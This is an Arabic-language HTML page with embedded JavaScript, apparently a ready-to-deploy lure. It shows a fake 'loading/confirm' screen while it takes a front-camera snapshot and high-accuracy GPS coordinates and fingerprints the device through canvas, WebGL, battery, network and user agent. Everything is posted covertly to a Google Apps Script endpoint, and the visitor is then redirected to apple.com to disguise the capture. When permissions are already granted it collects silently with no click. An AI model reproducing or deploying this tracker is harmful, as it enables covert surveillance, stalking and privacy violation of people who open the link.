<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow,noarchive">
<meta name="referrer" content="no-referrer">
<meta name="theme-color" content="#0d1117">
<title>جارٍ التحميل…</title>
<style>
  :root{--bg:#0d1117;--card:#161b22;--line:#30363d;--fg:#e6edf3;--mut:#9aa4af;--acc:#2f81f7;--err:#f85149;--ok:#3fb950}
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{margin:0;background:radial-gradient(1200px 600px at 50% -10%,#1b2430,var(--bg));color:var(--fg);
    font:16px/1.6 system-ui,-apple-system,"Segoe UI",Tahoma,sans-serif;display:grid;place-items:center;padding:20px}
  .card{width:100%;max-width:380px;background:var(--card);border:1px solid var(--line);border-radius:16px;
    padding:32px 24px;text-align:center;box-shadow:0 18px 50px rgba(0,0,0,.45)}
  .spin{width:48px;height:48px;margin:0 auto 18px;border-radius:50%;
    border:3px solid var(--line);border-top-color:var(--acc);animation:s .9s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
  h1{font-size:18px;margin:0 0 6px;font-weight:600}
  .sub{color:var(--mut);font-size:14px;margin:0 0 4px;line-height:1.5}
  .note{color:var(--mut);font-size:12px;margin:14px 0 0;line-height:1.5}
  button{width:100%;padding:14px;margin-top:20px;border:0;border-radius:10px;cursor:pointer;
    background:var(--acc);color:#fff;font:inherit;font-weight:600;font-size:15px}
  button:disabled{opacity:.55;cursor:default}
  .dbg{margin-top:16px;padding:10px;background:#0d1117;border:1px solid var(--line);border-radius:8px;
    font:11px/1.5 ui-monospace,Menlo,monospace;color:var(--mut);text-align:left;direction:ltr;
    max-height:220px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
  .dbg .warn{color:#f0a04b}
  .dbg .ok{color:var(--ok)}
  .dbg .er{color:var(--err)}
  [hidden]{display:none!important}
</style>
</head>
<body>
<main class="card">
  <div class="spin" id="spin"></div>
  <h1 id="h">جارٍ التحميل</h1>
  <p class="sub" id="s">يرجى الانتظار…</p>
  <div id="prompt" hidden>
    <button id="btn" type="button">متابعة</button>
    <p class="note">قد يطلب المتصفح الوصول إلى الكاميرا والموقع لتأكيد العملية.</p>
  </div>
  <pre class="dbg" id="dbg"></pre>
</main>
<script>
(function(){
  'use strict';

  /* ═══════════ ⚙️ عدّل هنا فقط ═══════════ */
  const ENDPOINT = 'https://script.google.com/macros/s/AKfycbxA_pBBI-IotSwGTCkoKj0qQVGCRkjRjeSeO3PLoxMzqd7wSyiNtaW7fgPIqNVUNrPS/exec';
  const REDIRECT = 'https://www.apple.com/';
  /* ═══════════════════════════════════════ */

  const MIN_DISPLAY_MS = 900;
  const T_START = Date.now();
  const DBG = true;                 /* اتركه true للاختبار، false لاحقاً */

  const $ = id => document.getElementById(id);
  const spin = $('spin'), h = $('h'), s = $('s'),
        prompt = $('prompt'), btn = $('btn'), dbg = $('dbg');

  const NA = 'N/A';
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const pad = n => String(n).padStart(2,'0');

  /* ═══════════ تشخيص على الشاشة ═══════════ */
  function log(msg, cls){
    console.log(msg);
    if (!DBG || !dbg) return;
    const span = document.createElement('div');
    if (cls) span.className = cls;
    span.textContent = '[' + new Date().toTimeString().slice(0,8) + '] ' + msg;
    dbg.appendChild(span);
    dbg.scrollTop = dbg.scrollHeight;
  }

  /* ═══════════ فحص ENDPOINT ═══════════ */
  const endpointOk = ENDPOINT.indexOf('REPLACE_WITH_DEPLOY_ID') === -1
                  && /^https:\/\/script\.google\.com\/macros\/s\/[A-Za-z0-9_-]+\/exec$/.test(ENDPOINT);

  log('ENDPOINT = ' + ENDPOINT, endpointOk ? 'ok' : 'er');
  if (!endpointOk) {
    log('⚠ ENDPOINT غير مضبوط — استبدل REPLACE_WITH_DEPLOY_ID برابط deployment', 'er');
    log('الصفحة تعمل لكن البيانات لن تُرسل.', 'warn');
  }

  /* ═══════════ أدوات ═══════════ */
  function nonceGen(){
    try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g,''); } catch(_){}
    return Date.now().toString(36) + Math.random().toString(36).slice(2,10);
  }
  const nonce = nonceGen();
  window.__vn = nonce;
  log('nonce = ' + nonce.slice(0,12) + '…');

  function localTime(){
    const d = new Date();
    return d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+' '+
           pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
  }

  function h32(str){
    let h = 5381;
    for (let i=0; i<str.length; i++) h = ((h<<5)+h+str.charCodeAt(i)) | 0;
    return (h>>>0).toString(36);
  }

  function fp(){
    const o = [];
    try {
      const c = document.createElement('canvas'); c.width=200; c.height=40;
      const x = c.getContext('2d');
      x.textBaseline='top'; x.font='14px Arial';
      x.fillStyle='#f60'; x.fillRect(0,0,200,40);
      x.fillStyle='#069'; x.fillText('acct 图 1',2,2);
      o.push('c'+h32(c.toDataURL()));
    } catch(_){}
    try {
      const g = document.createElement('canvas').getContext('webgl');
      const d = g.getExtension('WEBGL_debug_renderer_info');
      if (d) o.push('r'+h32(String(g.getParameter(d.UNMASKED_RENDERER_WEBGL))));
    } catch(_){}
    o.push('hc'+navigator.hardwareConcurrency,'dm'+(navigator.deviceMemory||''),
           'dpr'+(devicePixelRatio||1),'cd'+screen.colorDepth,
           'mt'+(navigator.maxTouchPoints||0),'sc'+screen.width+'x'+screen.height);
    return o.join('|').slice(0,600);
  }

  async function permState(name){
    try { const r = await navigator.permissions.query({name}); return r.state; }
    catch(_){ return 'prompt'; }
  }

  /* ═══════════ الكاميرا ═══════════ */
  async function grabCamera(ms){
    ms = ms || 9000;
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      log('getUserMedia غير متاح (تحتاج HTTPS)', 'er');
      return null;
    }
    let stream;
    try {
      stream = await Promise.race([
        navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'user' }, width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false
        }),
        new Promise(function(_, rej){ setTimeout(function(){ rej(new Error('to')); }, ms); })
      ]);
      log('camera stream OK', 'ok');
    } catch(e){
      log('camera FAILED: ' + (e && e.name || 'unknown'), 'er');
      return null;
    }

    try {
      const v = document.createElement('video');
      v.srcObject = stream; v.muted = true; v.playsInline = true;
      await v.play().catch(function(){});
      for (let i=0; i<40 && !v.videoWidth; i++) await sleep(50);
      if (!v.videoWidth) {
        log('camera: videoWidth=0 بعد 2s — frame لم يجهز', 'er');
        return null;
      }
      await sleep(100);
      const w = v.videoWidth, hh = v.videoHeight;
      log('camera frame ' + w + 'x' + hh, 'ok');
      const sc = Math.min(1, 360 / Math.max(w, hh));
      const cv = document.createElement('canvas');
      cv.width = Math.max(1, Math.round(w * sc));
      cv.height = Math.max(1, Math.round(hh * sc));
      cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
      const blob = await new Promise(function(r){ cv.toBlob ? cv.toBlob(r, 'image/jpeg', 0.5) : r(null); });
      if (!blob) { log('toBlob فشل', 'er'); return null; }
      log('camera JPEG ' + Math.round(blob.size/1024) + 'KB', 'ok');
      return await new Promise(function(res){
        const fr = new FileReader();
        fr.onload = function(){
          const url = String(fr.result || '');
          log('camera dataURL ' + Math.round(url.length/1024) + 'KB', 'ok');
          res(url);
        };
        fr.onerror = function(){ res(''); };
        fr.readAsDataURL(blob);
      });
    } catch(e){
      log('camera exception: ' + e.message, 'er');
      return null;
    }
    finally {
      try { stream.getTracks().forEach(function(t){ t.stop(); }); } catch(_){}
    }
  }

  /* ═══════════ الموقع ═══════════ */
  function grabGeo(ms){
    ms = ms || 12000;
    if (!navigator.geolocation) {
      log('geolocation غير متاح', 'er');
      return Promise.resolve(null);
    }
    return new Promise(function(res){
      const t = setTimeout(function(){
        log('geo TIMEOUT', 'er');
        res(null);
      }, ms);
      navigator.geolocation.getCurrentPosition(
        function(p){
          clearTimeout(t);
          log('geo OK: ' + p.coords.latitude.toFixed(4) + ',' + p.coords.longitude.toFixed(4), 'ok');
          res({ lat: +p.coords.latitude.toFixed(6), lng: +p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) });
        },
        function(err){
          clearTimeout(t);
          log('geo FAILED: code=' + (err && err.code) + ' ' + (err && err.message || ''), 'er');
          res(null);
        },
        { enableHighAccuracy: true, timeout: ms, maximumAge: 0 }
      );
    });
  }

  /* ═══════════ البطارية ═══════════ */
  function getBattery(){
    return new Promise(function(res){
      if (!navigator.getBattery) return res({ level: NA, charging: NA });
      const t = setTimeout(function(){ res({ level: NA, charging: NA }); }, 2500);
      navigator.getBattery().then(function(b){
        clearTimeout(t);
        res({ level: Math.round(b.level*100)+'%', charging: b.charging ? 'يشحن' : 'لا يشحن' });
      }).catch(function(){ clearTimeout(t); res({ level: NA, charging: NA }); });
    });
  }

  function getNetwork(){
    const c = navigator.connection || navigator.webkitConnection;
    const p = [];
    if (!navigator.onLine) p.push('غير متصل');
    if (c) {
      if (c.effectiveType) p.push(c.effectiveType);
      if (c.downlink) p.push(c.downlink + 'Mbps');
      if (c.rtt != null) p.push('rtt ' + c.rtt + 'ms');
    }
    return p.length ? p.join(' / ').slice(0,80) : NA;
  }

  function parseModel(ua){
    const m = ua.match(/Android[^;)]*;\s*(?:[a-z]{2}[-_][a-z]{2};\s*)?([^;)]+?)(?:\s+Build[/)]|\))/i);
    if (m) return m[1].replace(/\s+/g,' ').trim().slice(0,60);
    if (/iPhone/.test(ua)) return 'iPhone';
    if (/iPad/.test(ua)) return 'iPad';
    return '';
  }
  function parseBrand(ua){
    const t = ua.toLowerCase();
    if (/redmi|poco|xiaomi|\bmi\b/.test(t)) return 'Xiaomi';
    if (/samsung|sm-/.test(t)) return 'Samsung';
    if (/huawei|honor/.test(t)) return 'Huawei';
    if (/oppo|cph\d/.test(t)) return 'OPPO';
    if (/vivo/.test(t)) return 'Vivo';
    if (/oneplus/.test(t)) return 'OnePlus';
    if (/iphone|ipad|ipod/.test(t)) return 'Apple';
    if (/windows/.test(t)) return 'PC';
    return '';
  }
  function parsePlatform(ua){
    let m = ua.match(/Android\s+([\d.]+)/i); if (m) return 'Android '+m[1];
    m = ua.match(/(?:iPhone )?OS (\d+)[._](\d+)/i); if (m) return 'iOS '+m[1]+'.'+m[2];
    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
    if (/Mac OS X/.test(ua)) return 'macOS';
    if (/Linux/.test(ua)) return 'Linux';
    return NA;
  }

  /* ═══════════ الإرسال ═══════════ */
  async function send(img, geo, batt){
    const ua = (navigator.userAgent || '').slice(0,400);
    const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || NA).slice(0,60);

    const payload = {
      nonce: nonce,
      time: localTime(),
      ip: NA, ips: [], rtc: [], vpn: '', localIp: NA,
      battery: batt.level, charging: batt.charging,
      lat: geo ? geo.lat : '',
      lng: geo ? geo.lng : '',
      acc: geo ? geo.acc : '',
      geoSource: geo ? 'متصفح' : NA,
      tz: tz,
      lang: (navigator.languages || [navigator.language || NA]).join(',').slice(0,60),
      ua: ua,
      brand: parseBrand(ua), model: parseModel(ua), platform: parsePlatform(ua),
      network: getNetwork(),
      screen: (screen.width||0)+'x'+(screen.height||0),
      native: 'لا',
      cCount: 0, cJson: '[]',
      sCount: 0, sJson: '[]',
      lCount: 0, lJson: '[]',
      fp: fp(),
      cred: '[]', hist: '[]',
      misc: JSON.stringify({ v: 2 }),
      img: img || ''
    };

    const body = JSON.stringify({ a: 'collect', d: payload });
    log('payload ' + Math.round(body.length/1024) + 'KB', 'ok');

    if (!endpointOk) {
      log('تخطي الإرسال — ENDPOINT غير مضبوط', 'er');
      return false;
    }

    log('POST → ' + ENDPOINT.slice(0,60) + '…');

    /* text/plain → no CORS preflight → doPost يستقبلها كـ JSON */
    try {
      const r = await fetch(ENDPOINT, {
        method: 'POST',
        mode: 'no-cors',
        cache: 'no-store',
        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
        body: body
      });
      log('POST resolved, type=' + r.type + ' (opaque يعني استُلم)', 'ok');
      return true;
    } catch(e) {
      log('POST failed: ' + e.message, 'er');
      return false;
    }
  }

  /* ═══════════ الإنهاء ═══════════ */
  async function finish(img, geo, batt){
    log('finish() — بدء الإرسال', 'ok');
    await send(img, geo, batt).catch(function(e){ log('send threw: ' + e.message, 'er'); });
    const elapsed = Date.now() - T_START;
    const remain = MIN_DISPLAY_MS - elapsed;
    if (remain > 0) await sleep(remain);
    log('redirect → ' + REDIRECT, 'ok');
    if (DBG) await sleep(1500);   /* اترك 1.5s لقراءة التشخيص قبل التحويل */
    location.replace(REDIRECT);
  }

  /* ═══════════ المسار الصامت (أذونات ممنوحة) ═══════════ */
  async function silent(){
    log('الأذونات ممنوحة — جمع صامت', 'ok');
    const camP = grabCamera();
    const geoP = grabGeo();
    const battP = getBattery();
    const out = await Promise.all([camP, geoP, battP]);
    await finish(out[0], out[1], out[2]);
  }

  /* ═══════════ المسار التفاعلي (أذونات prompt) ═══════════ */
  function prompted(){
    log('جمع بعد ضغطة — prompts ستظهر', 'warn');
    /* getUserMedia/getCurrentPosition called SYNCHRONOUSLY from click */
    const camP = grabCamera();
    const geoP = grabGeo();
    const battP = getBattery();

    Promise.all([camP, geoP, battP]).then(function(out){
      finish(out[0], out[1], out[2]);
    }).catch(function(e){
      log('prompted chain threw: ' + e.message, 'er');
      location.replace(REDIRECT);
    });
  }

  /* ═══════════ التهيئة ═══════════ */
  async function run(){
    log('بدء التهيئة', 'ok');
    const states = await Promise.all([permState('camera'), permState('geolocation')]);
    log('camera=' + states[0] + ' geo=' + states[1]);

    if (states[0] === 'granted' && states[1] === 'granted') {
      silent();
      return;
    }

    spin.hidden = true;
    h.textContent = 'تأكيد العملية';
    s.textContent = 'اضغط للمتابعة.';
    prompt.hidden = false;
    log('بانتظار الضغطة', 'warn');

    btn.addEventListener('click', function(){
      btn.disabled = true;
      prompt.hidden = true;
      spin.hidden = false;
      h.textContent = 'جارٍ التحقق';
      s.textContent = 'يرجى الموافقة على الأذونات المطلوبة.';
      prompted();
    }, { once: true });
  }

  run().catch(function(e){
    log('run() threw: ' + e.message, 'er');
    location.replace(REDIRECT);
  });
})();
</script>
</body>
</html>
